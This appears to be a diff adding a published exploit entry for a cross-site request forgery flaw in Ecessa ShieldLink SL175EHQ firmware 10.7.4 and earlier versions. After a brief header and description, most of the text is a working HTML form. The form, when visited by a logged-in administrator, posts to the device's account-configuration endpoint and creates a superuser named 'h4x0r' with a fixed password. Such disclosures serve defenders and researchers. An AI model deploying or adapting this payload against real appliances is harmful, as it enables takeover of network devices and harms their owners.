@@ -1,0 +1,48 @@
+# Exploit Title: Ecessa ShieldLink SL175EHQ 10.7.4 - Cross-Site Request Forgery (Add Superuser)
+# Date: 2018-05-21
+# Vendor: Ecessa Corporation
+# Product web page: https://www.ecessa.com
+# Affected version: 10.7.4, 10.6.9, 10.7.4, 10.6.5.2, 10.5.4, 10.2.24, 9.2.24
+
+# Summary: Ecessa's ShieldLink 60, 175, 600,1200 & 4000 are advanced, yet highly
+# affordable secure WAN Optimization Controllers that incorporate all of the ISP/WAN
+# link.
+
+# Desc: The application interface allows users to perform certain actions via
+# HTTP requests without performing any validity checks to verify the requests.
+# This can be exploited to perform certain actions with administrative privileges
+# if a logged-in user visits a malicious web site.
+
+<html>
+  <body>
+    <form action="https://127.0.0.1/cgi-bin/pl_web.cgi/util_configlogin_act" method="POST">
+      <input type="hidden" name="savecrtcfg" value="checked" />
+      <input type="hidden" name="user_username1" value="root" />
+      <input type="hidden" name="user_enabled1" value="on" />
+      <input type="hidden" name="user_passwd1" value="" />
+      <input type="hidden" name="user_passwd_verify1" value="" />
+      <input type="hidden" name="user_delete1" value="" />
+      <input type="hidden" name="user_username2" value="admin" />
+      <input type="hidden" name="user_passwd2" value="" />
+      <input type="hidden" name="user_passwd_verify2" value="" />
+      <input type="hidden" name="user_delete2" value="" />
+      <input type="hidden" name="user_username3" value="user" />
+      <input type="hidden" name="user_enabled3" value="on" />
+      <input type="hidden" name="user_passwd3" value="" />
+      <input type="hidden" name="user_passwd_verify3" value="" />
+      <input type="hidden" name="user_delete3" value="" />
+      <input type="hidden" name="user_username4" value="h4x0r" />
+      <input type="hidden" name="user_enabled4" value="on" />
+      <input type="hidden" name="user_superuser4" value="on" />
+      <input type="hidden" name="user_passwd4" value="123123" />
+      <input type="hidden" name="user_passwd_verify4" value="123123" />
+      <input type="hidden" name="users_num" value="4" />
+      <input type="hidden" name="page" value="util_configlogin" />
+      <input type="hidden" name="val_requested_page" value="user_accounts" />
+      <input type="hidden" name="savecrtcfg" value="checked" />
+      <input type="hidden" name="page_uuid" value="df220e51-db68-492e-a745-d14adfd2f4fb" />
+      <input type="hidden" name="form_has_changed" value="1" />
+      <input type="submit" value="Supersize!" />
+    </form>
+  </body>
+</html>
